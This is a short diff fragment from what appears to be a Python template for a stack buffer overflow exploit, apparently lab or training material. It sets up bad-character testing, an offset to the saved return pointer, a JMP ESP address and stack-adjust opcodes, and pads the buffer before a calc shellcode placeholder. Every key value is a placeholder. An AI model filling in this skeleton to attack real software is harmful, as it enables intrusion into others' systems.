@@ -28,13 +28,13 @@ with open("badchar_test.bin", "wb") as f:
 	f.write(badchar_test)
 
 #build a message
+shellcode_calc= SHELLCODE
 
 buf_totlen= TOTAL LENGTH
 offset_srp = OFFSET NUMBER
 ptr_jmp_esp = 0xADDRESS
 sub_esp_10 = "\x83\xec\x10"
 
-shellcode_calc=
 
 buf = ""
 buf += "A"*(offset_srp - len(buf)) #padding
